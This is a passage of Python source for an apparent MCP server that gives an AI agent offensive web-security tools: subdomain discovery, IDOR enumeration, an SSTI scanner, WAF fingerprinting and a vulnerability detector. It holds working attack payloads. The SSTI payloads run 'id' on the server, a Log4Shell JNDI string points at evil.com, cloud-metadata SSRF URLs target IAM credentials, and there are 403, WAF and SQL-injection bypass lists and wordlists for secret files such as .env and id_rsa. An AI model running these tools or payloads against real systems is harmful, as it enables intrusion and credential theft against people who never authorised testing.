               "git", "ci", "monitor", "db", "redis", "elastic", "auth", "sso", "login",
               "webmail", "remote", "cloud", "beta", "demo", "sandbox", "backup", "old"]

    found = []
    for prefix in prefixes:
        sub = f"{prefix}.{target}"
        try:
            ip = socket.gethostbyname(sub)
            found.append({"subdomain": sub, "ip": ip})
        except socket.gaierror:
            pass

    progress.update("HTTP probing")
    live_subs = []
    for sub_info in found:
        for scheme in ["https", "http"]:
            url = f"{scheme}://{sub_info['subdomain']}"
            cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
                   "-w", "%{http_code}|%{redirect_url}", url]
            r = run_command_advanced(cmd, timeout=8, trace=trace)
            parts = r["stdout"].split("|")
            status = int(parts[0]) if parts and parts[0].isdigit() else 0
            if status > 0 and status != 000:
                sub_info["http_status"] = status
                sub_info["url"] = url
                sub_info["redirect"] = parts[1] if len(parts) > 1 else ""
                live_subs.append(sub_info.copy())
                break

    progress.update("Certificate check")
    crt_cmd = ["curl", "-s", "--max-time", "15", f"https://crt.sh/?q=%25.{target}&output=json"]
    crt_result = run_command_advanced(crt_cmd, timeout=20, trace=trace)
    crt_subs = set()
    try:
        for entry in json.loads(crt_result["stdout"]):
            for name in entry.get("name_value", "").split("\n"):
                name = name.strip().lower()
                if name.endswith(f".{target}"):
                    crt_subs.add(name)
    except Exception:
        pass

    progress.update("Analysis")
    output = {
        "status": "success", "target": target,
        "dns_found": len(found), "live_subdomains": len(live_subs),
        "certificate_subdomains": len(crt_subs),
        "resolved_subdomains": found,
        "live_http_subdomains": live_subs,
        "crt_sh_subdomains": sorted(crt_subs)[:100]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("subdomain_scanner", target, output)
    log_tool_execution("subdomain_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def idor_tester(
    target: str,
    param: str = "id",
    start_id: int = 1,
    end_id: int = 20,
    method: str = "GET",
    auth_header: str = "",
    timeout: int = 60
) -> str:
    """
    IDOR (Insecure Direct Object Reference) tester. Iterates through object IDs to detect unauthorized access.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("idor_tester", target, 5)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "param": param, "range": f"{start_id}-{end_id}"}

    progress.update("Testing IDOR")
    results = []
    baseline_sizes = set()

    for i in range(start_id, min(end_id + 1, start_id + 50)):
        if "{" + param + "}" in url:
            test_url = url.replace("{" + param + "}", str(i))
        elif f"{param}=" in url:
            test_url = re.sub(f"{param}=\\d+", f"{param}={i}", url)
        else:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={i}"

        cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}", test_url]
        if auth_header:
            cmd.extend(["-H", auth_header])
        r = run_command_advanced(cmd, timeout=12, trace=trace)

        lines = r["stdout"].rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else ""
        meta = lines[-1] if lines else "0|0"
        parts = meta.split("|")
        status = int(parts[0]) if parts and parts[0].isdigit() else 0
        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0

        entry = {"id": i, "url": test_url, "status": status, "size": size}
        if status == 200 and size > 0:
            entry["accessible"] = True
            entry["body_preview"] = body[:300]
            baseline_sizes.add(size)
        else:
            entry["accessible"] = False
        results.append(entry)

    progress.update("Analyzing patterns")
    accessible = [r for r in results if r.get("accessible")]
    unique_sizes = len(set(r["size"] for r in accessible))
    possibly_vulnerable = len(accessible) > 1 and unique_sizes > 1

    progress.update("Analysis")
    output = {
        "status": "success", "target": url, "parameter": param,
        "tested_range": f"{start_id}-{min(end_id, start_id + 49)}",
        "accessible_count": len(accessible),
        "total_tested": len(results),
        "unique_response_sizes": unique_sizes,
        "possibly_vulnerable": possibly_vulnerable,
        "accessible_objects": accessible[:20],
        "all_results": results[:30],
        "severity": "HIGH" if possibly_vulnerable else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("idor_tester", target, output)
    log_tool_execution("idor_tester", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def ssti_scanner(
    target: str,
    param: str = "name",
    method: str = "GET",
    data: str = "",
    timeout: int = 60
) -> str:
    """
    SSTI (Server-Side Template Injection) scanner. Tests for Jinja2, Twig, Freemarker, Mako, Pebble, and other template engines.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("ssti_scanner", target, 5)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "param": param, "method": method}

    progress.update("Preparing SSTI payloads")
    payloads = [
        {"engine": "generic", "payload": "{{7*7}}", "expected": "49"},
        {"engine": "generic", "payload": "${7*7}", "expected": "49"},
        {"engine": "generic", "payload": "#{7*7}", "expected": "49"},
        {"engine": "jinja2", "payload": "{{config}}", "expected": "SECRET_KEY"},
        {"engine": "jinja2", "payload": "{{self.__class__.__mro__}}", "expected": "type"},
        {"engine": "jinja2", "payload": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval('7*7') }}{% endif %}{% endfor %}", "expected": "49"},
        {"engine": "twig", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}", "expected": ""},
        {"engine": "freemarker", "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "expected": "uid="},
        {"engine": "mako", "payload": "${self.module.cache.util.os.popen('id').read()}", "expected": "uid="},
        {"engine": "erb", "payload": "<%= 7*7 %>", "expected": "49"},
        {"engine": "pebble", "payload": "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}", "expected": "uid="},
        {"engine": "smarty", "payload": "{php}echo 7*7;{/php}", "expected": "49"},
        {"engine": "velocity", "payload": "#set($x=7*7)${x}", "expected": "49"},
    ]

    progress.update("Testing payloads")
    results = []
    for p in payloads:
        encoded = urllib.parse.quote(p["payload"])
        if method == "GET":
            test_url = f"{url}?{param}={encoded}" if "?" not in url else f"{url}&{param}={encoded}"
            cmd = ["curl", "-sk", "--max-time", "10", test_url]
        else:
            post_data = f"{param}={encoded}"
            if data:
                post_data = f"{data}&{post_data}"
            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST", "-d", post_data, url]

        r = run_command_advanced(cmd, timeout=15, trace=trace)
        found = p["expected"] and p["expected"] in r["stdout"]
        results.append({
            "engine": p["engine"], "payload": p["payload"],
            "expected": p["expected"], "found": found,
            "response_preview": r["stdout"][:300] if found else "",
            "response_length": len(r["stdout"])
        })

    progress.update("Analysis")
    vulns = [r for r in results if r["found"]]
    detected_engines = list(set(r["engine"] for r in vulns))

    output = {
        "status": "success", "target": url, "parameter": param,
        "payloads_tested": len(payloads), "vulnerabilities_found": len(vulns),
        "detected_engines": detected_engines,
        "vulnerable_payloads": vulns,
        "all_results": results,
        "severity": "CRITICAL" if vulns else "info",
        "recommendations": [
            "Use auto-escaping in templates",
            "Sanitize user input before template rendering",
            "Use sandboxed template environments",
            "Avoid passing raw user input to template engines"
        ] if vulns else ["No SSTI detected"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("ssti_scanner", target, output)
    log_tool_execution("ssti_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def run_curl_advanced(
    url: str,
    method: str = "GET",
    headers: str = "",
    data: str = "",
    follow_redirects: bool = True,
    include_headers: bool = True,
    proxy: str = "",
    cookies: str = "",
    auth: str = "",
    timeout: int = 30
) -> str:
    """
    Advanced curl wrapper with full control over HTTP requests. Supports custom headers, auth, proxies, cookies.
    """
    target = url.replace("http://", "").replace("https://", "").split("/")[0]
    trace, progress, exec_dir = _init_tool_context("run_curl_advanced", target, 4)
    inputs = {"url": url, "method": method, "has_data": bool(data)}

    progress.update("Building request")
    cmd = ["curl", "-sk", "--max-time", str(timeout)]
    if method != "GET":
        cmd.extend(["-X", method])
    if include_headers:
        cmd.append("-i")
    if follow_redirects:
        cmd.extend(["-L", "--max-redirs", "10"])
    if headers:
        for h in headers.split(";"):
            if h.strip():
                cmd.extend(["-H", h.strip()])
    if data:
        cmd.extend(["-d", data])
    if proxy:
        cmd.extend(["-x", proxy])
    if cookies:
        cmd.extend(["-b", cookies])
    if auth:
        cmd.extend(["-u", auth])
    cmd.append(url)

    progress.update("Executing request")
    trace.command(f"curl {method} {url}")
    result = run_command_advanced(cmd, timeout=timeout + 10, trace=trace)

    progress.update("Parsing response")
    response_headers = {}
    body = result["stdout"]
    if include_headers and "\r\n\r\n" in body:
        header_section, body = body.split("\r\n\r\n", 1)
        for line in header_section.split("\r\n"):
            if ":" in line:
                k, _, v = line.partition(":")
                response_headers[k.strip()] = v.strip()

    output = {
        "status": "success", "url": url, "method": method,
        "response_headers": response_headers,
        "body": body[:5000],
        "body_length": len(body),
        "return_code": result["return_code"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("run_curl_advanced", target, output)
    log_tool_execution("run_curl_advanced", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def waf_fingerprint(
    target: str,
    timeout: int = 60
) -> str:
    """
    WAF (Web Application Firewall) detection and fingerprinting. Identifies Cloudflare, AWS WAF, Akamai, ModSecurity, etc.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("waf_fingerprint", target, 5)
    url = target if target.startswith("http") else f"https://{target}"
    inputs = {"target": url}

    progress.update("Baseline request")
    baseline_cmd = ["curl", "-sI", "-k", "--max-time", "10", url]
    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
    baseline_headers = baseline["stdout"].lower()

    waf_signatures = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai": ["akamai", "x-akamai", "akamai-ghost"],
        "Imperva/Incapsula": ["incap_ses", "incapsula", "x-iinfo", "visid_incap"],
        "F5 BIG-IP": ["bigipserver", "f5", "x-wa-info"],
        "ModSecurity": ["mod_security", "modsecurity", "nyob"],
        "Sucuri": ["sucuri", "x-sucuri-id", "x-sucuri-cache"],
        "Barracuda": ["barra_counter_session", "barracuda"],
        "Fortinet/FortiWeb": ["fortigate", "fortiweb", "fortiwafd"],
        "DDoS-Guard": ["ddos-guard"],
        "StackPath": ["stackpath"],
        "Varnish": ["x-varnish", "via: varnish"],
        "Nginx": ["nginx"],
        "Apache": ["apache"]
    }

    detected_wafs = []
    for waf, sigs in waf_signatures.items():
        for sig in sigs:
            if sig.lower() in baseline_headers:
                detected_wafs.append({"name": waf, "indicator": sig, "source": "headers"})
                break

    progress.update("Trigger WAF with malicious payload")
    trigger_payloads = [
        "<script>alert('XSS')</script>",
        "' OR 1=1 --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
    ]
    trigger_results = []
    for payload in trigger_payloads:
        encoded = urllib.parse.quote(payload)
        trigger_url = f"{url}?test={encoded}"
        trigger_cmd = ["curl", "-sk", "--max-time", "10", "-o", "/dev/null",
                      "-w", "%{http_code}", trigger_url]
        r = run_command_advanced(trigger_cmd, timeout=15, trace=trace)
        status = int(r["stdout"]) if r["stdout"].isdigit() else 0
        blocked = status in [403, 406, 429, 503]
        trigger_results.append({"payload": payload, "status": status, "blocked": blocked})
        if blocked and not any(w["source"] == "blocking" for w in detected_wafs):
            detected_wafs.append({"name": "Unknown WAF", "indicator": f"Blocked payload (HTTP {status})",
                                "source": "blocking"})

    progress.update("wafw00f check")
    wafw00f_cmd = ["wafw00f", url]
    wafw00f_result = run_command_advanced(wafw00f_cmd, timeout=30, trace=trace)

    progress.update("Analysis")
    output = {
        "status": "success", "target": url,
        "waf_detected": bool(detected_wafs),
        "wafs": detected_wafs,
        "trigger_tests": trigger_results,
        "wafw00f_output": wafw00f_result["stdout"][:1500],
        "bypass_recommendations": [
            "Try different encoding (URL, double-URL, Unicode)",
            "Use HTTP parameter pollution",
            "Try alternate HTTP methods",
            "Modify Content-Type header",
            "Use chunked transfer encoding",
            "Insert null bytes or comments in payloads"
        ] if detected_wafs else [],
        "severity": "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("waf_fingerprint", target, output)
    log_tool_execution("waf_fingerprint", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# SERVER SECURITY AUDIT (SELF-AUDIT)
# ============================================================================

@mcp.tool()
@resolve_references
async def server_security_audit() -> str:
    """
    Security audit of this MCP server itself. Checks file permissions, input validation, dependency vulnerabilities,
    configuration security, and provides hardening recommendations.
    """
    target = "mcp_server_self"
    trace, progress, exec_dir = _init_tool_context("server_security_audit", target, 7)
    inputs = {"audit_type": "self"}

    findings = []

    progress.update("Checking file permissions")
    server_file = os.path.abspath(__file__)
    stat = os.stat(server_file)
    perms = oct(stat.st_mode)[-3:]
    if perms != "644" and perms != "600":
        findings.append({"category": "file_permissions", "severity": "MEDIUM",
                        "detail": f"Server file permissions: {perms} (recommended: 644)",
                        "file": server_file})

    for d in [SESSIONS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
        if os.path.exists(d):
            d_perms = oct(os.stat(d).st_mode)[-3:]
            if d_perms not in ["755", "700"]:
                findings.append({"category": "directory_permissions", "severity": "LOW",
                                "detail": f"Directory {d} permissions: {d_perms}"})

    progress.update("Checking input validation")
    validation_checks = {
        "InputValidator class": "InputValidator" in open(server_file).read(),
        "sanitize_target": "sanitize_target" in open(server_file).read(),
        "validate_command_args": "validate_command_args" in open(server_file).read(),
        "validate_file_path": "validate_file_path" in open(server_file).read()
    }
    for check, present in validation_checks.items():
        if not present:
            findings.append({"category": "input_validation", "severity": "HIGH",
                            "detail": f"Missing: {check}"})

    progress.update("Checking for hardcoded secrets")
    with open(server_file) as f:
        content = f.read()
    secret_patterns = [
        (r'(?:password|secret|key|token)\s*=\s*["\'][^"\']{8,}["\']', "Potential hardcoded secret"),
        (r'(?:api[_-]?key)\s*[:=]\s*["\'][^"\']+["\']', "Potential API key"),
    ]
    for pattern, desc in secret_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            findings.append({"category": "hardcoded_secrets", "severity": "HIGH",
                            "detail": desc, "count": len(matches)})

    progress.update("Checking dependency security")
    pip_audit = run_command_advanced(["pip", "list", "--outdated", "--format=json"], timeout=30, trace=trace)
    try:
        outdated = json.loads(pip_audit["stdout"])
        if outdated:
            findings.append({"category": "outdated_dependencies", "severity": "LOW",
                            "detail": f"{len(outdated)} outdated packages",
                            "packages": [f"{p['name']}:{p['version']}->{p['latest_version']}" for p in outdated[:10]]})
    except Exception:
        pass

    progress.update("Checking logging security")
    if "trace.jsonl" in content:
        findings.append({"category": "logging", "severity": "info",
                        "detail": "Forensic JSONL trace logging is enabled"})
    if SESSIONS_DIR and os.path.exists(SESSIONS_DIR):
        session_count = len(os.listdir(SESSIONS_DIR))
        if session_count > 100:
            findings.append({"category": "log_retention", "severity": "LOW",
                            "detail": f"{session_count} sessions stored - consider rotation"})

    progress.update("Architecture security score")
    security_features = {
        "InputValidator": "InputValidator" in content,
        "TraceLogger": "TraceLogger" in content,
        "SessionManager": "SessionManager" in content,
        "ToolChainEngine": "ToolChainEngine" in content,
        "CVECartographer": "CVECartographer" in content,
        "hierarchical_logging": "sessions/" in content,
        "progress_reporting": "ProgressReporter" in content,
        "command_sanitization": "shlex" in content,
        "timeout_enforcement": "timeout" in content,
        "error_handling": "try:" in content and "except" in content
    }
    score = sum(1 for v in security_features.values() if v)
    total = len(security_features)

    output = {
        "status": "success",
        "findings": findings,
        "finding_count": len(findings),
        "security_features": security_features,
        "security_score": f"{score}/{total}",
        "grade": "A" if score >= total * 0.9 else "B" if score >= total * 0.7 else "C",
        "recommendations": [
            "Rotate session logs after 30 days",
            "Add rate limiting per client",
            "Implement tool execution quotas",
            "Add RBAC (Role-Based Access Control) for sensitive tools",
            "Enable TLS for MCP transport",
            "Add integrity checks for tool chain data"
        ],
        "severity": "HIGH" if any(f["severity"] == "HIGH" for f in findings) else "info"
    }

    progress.update("Complete")
    log_tool_execution("server_security_audit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)



# ============================================================================
# ENHANCED MODULES — DEEP VULNERABILITY DETECTION
# ============================================================================

# --- Enhanced Payload Collections (AWS, Golang, WAF bypass, Cloud) ---

class AdvancedPayloads:
    """Advanced payload collections for deep detection per user analysis requirements."""
    
    @staticmethod
    def aws_cloud_payloads() -> Dict[str, List[str]]:
        """AWS-specific payloads for cloud infrastructure testing."""
        return {
            "s3_buckets": [
                "s3://{target}-backup", "s3://{target}-prod", "s3://{target}-dev",
                "s3://{target}-staging", "s3://{target}-assets", "s3://{target}-logs",
                "s3://{target}-data", "s3://{target}-uploads", "s3://{target}-static",
                "s3://backup-{target}", "s3://prod-{target}", "s3://dev-{target}",
            ],
            "metadata_endpoints": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.170.2/v2/credentials",  # ECS task role
                "http://fd00:ec2::254/latest/meta-data/",  # IPv6
            ],
            "aws_endpoints_to_fuzz": [
                "/aws", "/s3", "/dynamodb", "/lambda", "/cloudformation",
                "/cloudtrail", "/kms", "/iam", "/ec2", "/rds",
                "/.aws/credentials", "/.aws/config",
            ],
            "cloudtrail_exposure": [
                "/logs/cloudtrail/", "/var/log/cloudtrail/",
                "/cloudtrail-logs/", "/audit-logs/",
            ],
        }
    
    @staticmethod
    def golang_specific_payloads() -> Dict[str, List[str]]:
        """Golang application specific payloads."""
        return {
            "debug_endpoints": [
                "/debug/pprof/", "/debug/pprof/heap", "/debug/pprof/goroutine",
                "/debug/pprof/threadcreate", "/debug/pprof/block", "/debug/pprof/mutex",
                "/debug/pprof/profile", "/debug/pprof/trace",
                "/debug/vars", "/debug/requests", "/debug/events",
                "/metrics", "/healthz", "/readyz", "/livez",
            ],
            "framework_paths": [
                "/routes", "/handlers", "/models", "/controllers",
                "/api/internal", "/internal/", "/private/",
            ],
            "file_extensions": [".go", ".mod", ".sum", ".toml"],
            "ssti_golang": [
                "{{.}}", "{{len .}}", "{{printf \"%s\" .}}",
                "{{range .}}{{.}}{{end}}", '{{define "T"}}{{end}}',
            ],
        }
    
    @staticmethod
    def waf_bypass_payloads() -> Dict[str, List[str]]:
        """WAF bypass techniques for common WAFs."""
        return {
            "case_variation": [
                "<ScRiPt>alert(1)</ScRiPt>", "<SCRIPT>alert(1)</SCRIPT>",
                "<scRIPT>alert(1)</scRIPT>",
            ],
            "encoding_bypass": [
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "%253Cscript%253Ealert(1)%253C%252Fscript%253E",  # double encode
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # unicode
            ],
            "null_byte_bypass": [
                "<scri%00pt>alert(1)</scri%00pt>",
                "admin%00.php", "/etc/passwd%00.jpg",
            ],
            "header_bypass_403": [
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-Host: localhost",
                "X-Custom-IP-Authorization: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Host: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "True-Client-IP: 127.0.0.1",
            ],
            "path_bypass_403": [
                "/admin", "/ADMIN", "/Admin", "/aDmIn",
                "/%61dmin", "/%2Fadmin", "/%252Fadmin",
                "/admin%00", "/admin%20", "/admin%09",
                "/admin/.", "/admin/./", "/./admin/",
                "/admin..;/", "//admin", "/admin//",
                "/admin%c0%af", "/admin;/",
            ],
            "method_bypass": ["TRACE", "OPTIONS", "CONNECT", "PATCH", "PROPFIND"],
            "sqli_waf_bypass": [
                "/*!50000UNION*/+/*!50000SELECT*/+1,2,3",
                "UNION%0aSELECT%0a1,2,3",
                "uNiOn+sElEcT+1,2,3",
                "' AND 1=1#", "' AND 1=1-- -",
                "'+UNION+ALL+SELECT+NULL,NULL,NULL--+-",
            ],
        }
    
    @staticmethod
    def config_files_wordlist() -> List[str]:
        """Sensitive configuration files to discover."""
        return [
            ".env", ".env.local", ".env.production", ".env.staging", ".env.backup",
            "config.php", "config.yml", "config.yaml", "config.json", "config.xml",
            "settings.py", "settings.json", "settings.yml",
            "secrets.yaml", "secrets.json", "secrets.yml",
            "credentials.json", "credentials.yml",
            ".git/config", ".git/HEAD", ".gitignore",
            ".svn/entries", ".hg/hgrc",
            "web.config", "appsettings.json", "appsettings.Development.json",
            "docker-compose.yml", "docker-compose.override.yml",
            "Dockerfile", ".dockerignore",
            "package.json", "package-lock.json", "yarn.lock",
            "composer.json", "composer.lock",
            "Gemfile", "Gemfile.lock",
            "requirements.txt", "Pipfile", "Pipfile.lock",
            "go.mod", "go.sum",
            ".htaccess", ".htpasswd",
            "robots.txt", "sitemap.xml",
            "crossdomain.xml", "clientaccesspolicy.xml",
            "phpinfo.php", "info.php", "test.php",
            "backup.sql", "dump.sql", "database.sql",
            "id_rsa", "id_rsa.pub", ".ssh/authorized_keys",
            "wp-config.php", "wp-config.php.bak",
            "/actuator", "/actuator/env", "/actuator/health",
            "/swagger.json", "/swagger-ui.html", "/api-docs",
            "/openapi.json", "/v2/api-docs", "/v3/api-docs",
        ]
    
    @staticmethod
    def sensitive_dirs_wordlist() -> List[str]:
        """Critical directories to enumerate."""
        return [
            ".git", ".svn", ".hg", ".bzr",
            "node_modules", "vendor", "src", "lib",
            "backup", "backups", "bak", "old", "temp", "tmp",
            "admin", "administrator", "panel", "dashboard", "cp",
            "api", "api/v1", "api/v2", "api/v3", "api/internal",
            "graphql", "graphiql",
            "debug", "test", "testing", "staging", "dev",
            "private", "internal", "secret", "hidden",
            "uploads", "files", "documents", "media", "assets",
            "cgi-bin", "scripts", "includes",
            "phpmyadmin", "pma", "adminer", "dbadmin",
            "wp-admin", "wp-includes", "wp-content",
            "console", "terminal", "shell",
        ]


@mcp.tool()
@resolve_references
async def smart_vulnerability_detector(
    target: str, 
    scan_depth: str = "standard",
    focus_areas: str = "all",
    timeout: int = 300
) -> str:
    """
    Intelligent vulnerability detector that analyzes HTTP responses for critical patterns.
    Detects: RCE indicators, Auth bypass, Data leaks, Misconfigurations.
    Focus areas: all, rce, auth_bypass, data_leak, misconfig, cloud, injection
    Scan depth: quick, standard, deep
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("smart_vulnerability_detector", target, 10)
    inputs = {"target": target, "scan_depth": scan_depth, "focus_areas": focus_areas}
    
    url = target if target.startswith("http") else f"https://{target}"
    findings = []
    
    # Step 1: Baseline HTTP analysis
    progress.update("Baseline HTTP analysis", "Probing target")
    baseline_cmd = ["curl", "-skI", "--max-time", "15", "-L", url]
    baseline = run_command_advanced(baseline_cmd, timeout=30, trace=trace)
    headers_raw = baseline["stdout"].lower()
    
    # Step 2: Technology fingerprinting from headers
    progress.update("Technology fingerprinting")
    tech_indicators = {
        "golang": ["x-powered-by: go", "server: go", "content-type: application/json"],
        "aws": ["x-amzn-", "x-amz-", "server: amazons3", "server: awselb", "via: cloudfront"],
        "nginx": ["server: nginx"],
        "apache": ["server: apache"],
        "cloudflare": ["server: cloudflare", "cf-ray"],
        "express": ["x-powered-by: express"],
    }
    detected_stack = []
    for tech, indicators in tech_indicators.items():
        if any(ind in headers_raw for ind in indicators):
            detected_stack.append(tech)
    
    # Step 3: Critical endpoint probing
    progress.update("Critical endpoint probing")
    critical_paths = [
        "/.env", "/.git/config", "/debug/pprof/", "/actuator/env",
        "/swagger.json", "/api-docs", "/.aws/credentials",
        "/server-status", "/server-info", "/.well-known/security.txt",
        "/robots.txt", "/sitemap.xml", "/wp-config.php.bak",
    ]
    
    if "golang" in detected_stack:
        critical_paths.extend(AdvancedPayloads.golang_specific_payloads()["debug_endpoints"])
    if "aws" in detected_stack:
        critical_paths.extend(AdvancedPayloads.aws_cloud_payloads()["aws_endpoints_to_fuzz"])
    
    exposed_endpoints = []
    for path in critical_paths[:30]:  # Limit to avoid timeout
        probe_url = f"{url.rstrip('/')}{path}"
        probe_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", probe_url]
        probe_result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
        status_code = probe_result["stdout"].strip()
        if status_code in ["200", "301", "302", "401", "403", "405"]:
            exposed_endpoints.append({"path": path, "status": status_code})
            if status_code == "200":
                findings.append({
                    "type": "EXPOSED_ENDPOINT", "severity": "HIGH",
                    "path": path, "status": status_code,
                    "detail": f"Endpoint accessible: {path}"
                })
    
    # Step 4: 403 bypass testing
    progress.update("403 bypass testing")
    forbidden_paths = [ep for ep in exposed_endpoints if ep["status"] == "403"]
    bypass_headers = AdvancedPayloads.waf_bypass_payloads()["header_bypass_403"]
    
    for forbidden in forbidden_paths[:5]:
        for header in bypass_headers[:6]:
            h_name, h_value = header.split(": ", 1)
            bypass_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
                         "-H", f"{h_name}: {h_value}", f"{url.rstrip('/')}{forbidden['path']}"]
            bypass_result = run_command_advanced(bypass_cmd, timeout=12, trace=trace)
            if bypass_result["stdout"].strip() == "200":
                findings.append({
                    "type": "403_BYPASS", "severity": "CRITICAL",
                    "path": forbidden["path"], "bypass_header": header,
                    "detail": f"403 bypassed with {h_name} header"
                })
                break
    
    # Step 5: Information disclosure via error pages
    progress.update("Information disclosure analysis")
    error_triggers = [
        f"{url}/{'A' * 500}", f"{url}/%00", f"{url}/\x00",
        f"{url}/?debug=true", f"{url}/?test=1&__debug=1",
    ]
    for trigger in error_triggers:
        err_cmd = ["curl", "-sk", "--max-time", "8", trigger]
        err_result = run_command_advanced(err_cmd, timeout=12, trace=trace)
        body = err_result["stdout"]
        # Check for stack traces, file paths, version info
        leak_patterns = [
            ("STACK_TRACE", r"(?:at |File |Traceback|goroutine|panic:)"),
            ("FILE_PATH", r"(?:/usr/|/var/|/home/|/opt/|/app/|/src/)"),
            ("VERSION_LEAK", r"(?:version|v\d+\.\d+|go\d+\.\d+)"),
            ("DB_ERROR", r"(?:SQL|mysql|postgres|sqlite|ORM|GORM)"),
            ("SECRET_LEAK", r"(?:api_key|secret|password|token|aws_)"),
        ]
        for leak_type, pattern in leak_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                findings.append({
                    "type": f"INFO_DISCLOSURE_{leak_type}", "severity": "HIGH",
                    "trigger": trigger[:100],
                    "detail": f"Information leak detected: {leak_type}"
                })
                break
    
    # Step 6: SSRF via cloud metadata (if AWS detected)
    progress.update("Cloud metadata SSRF testing")
    if "aws" in detected_stack or focus_areas in ["all", "cloud"]:
        metadata_urls = AdvancedPayloads.aws_cloud_payloads()["metadata_endpoints"]
        for meta_url in metadata_urls[:4]:
            # Try common SSRF params
            for param in ["url", "redirect", "uri", "path", "next", "link", "proxy"]:
                ssrf_url = f"{url}/?{param}={meta_url}"
                ssrf_cmd = ["curl", "-sk", "--max-time", "10", ssrf_url]
                ssrf_result = run_command_advanced(ssrf_cmd, timeout=15, trace=trace)
                if any(x in ssrf_result["stdout"] for x in ["iam", "instance-id", "ami-id", "security-credentials"]):
                    findings.append({
                        "type": "SSRF_CLOUD_METADATA", "severity": "CRITICAL",
                        "param": param, "payload": meta_url,
                        "detail": "AWS metadata accessible via SSRF!"
                    })
    
    # Step 7: Security header analysis (deep)
    progress.update("Deep security header analysis")
    header_issues = []
    if "strict-transport-security" not in headers_raw:
        header_issues.append({"header": "HSTS", "severity": "MEDIUM", "detail": "Missing HSTS header"})
    if "content-security-policy" not in headers_raw:
        header_issues.append({"header": "CSP", "severity": "MEDIUM", "detail": "Missing CSP header"})
    elif "unsafe-inline" in headers_raw or "unsafe-eval" in headers_raw:
        header_issues.append({"header": "CSP", "severity": "HIGH", "detail": "CSP allows unsafe-inline/eval"})
    if "x-frame-options" not in headers_raw:
        header_issues.append({"header": "X-Frame-Options", "severity": "MEDIUM", "detail": "Clickjacking possible"})
    if "x-content-type-options" not in headers_raw:
        header_issues.append({"header": "X-Content-Type-Options", "severity": "LOW", "detail": "MIME sniffing possible"})
    for issue in header_issues:
        findings.append({"type": "HEADER_SECURITY", **issue})
    
    # Step 8: Method enumeration
    progress.update("HTTP method enumeration")
    options_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url]
    options_result = run_command_advanced(options_cmd, timeout=15, trace=trace)
    allowed_methods = []
    for line in options_result["stdout"].split("\n"):
        if "allow:" in line.lower():
            allowed_methods = [m.strip() for m in line.split(":", 1)[1].split(",")]
    dangerous_methods = [m for m in allowed_methods if m.upper() in ["PUT", "DELETE", "TRACE", "CONNECT"]]
    if dangerous_methods:
        findings.append({
            "type": "DANGEROUS_METHODS", "severity": "HIGH",
            "methods": dangerous_methods,
            "detail": f"Dangerous HTTP methods allowed: {dangerous_methods}"
        })
    
    # Step 9: Generate severity summary
    progress.update("Generating report")
    severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev = f.get("severity", "INFO")
        severity_counts[sev] = severity_counts.get(sev, 0) + 1
    
    output = {
        "status": "success",
        "target": target,
        "detected_stack": detected_stack,
        "scan_depth": scan_depth,
        "total_findings": len(findings),
        "severity_summary": severity_counts,
        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
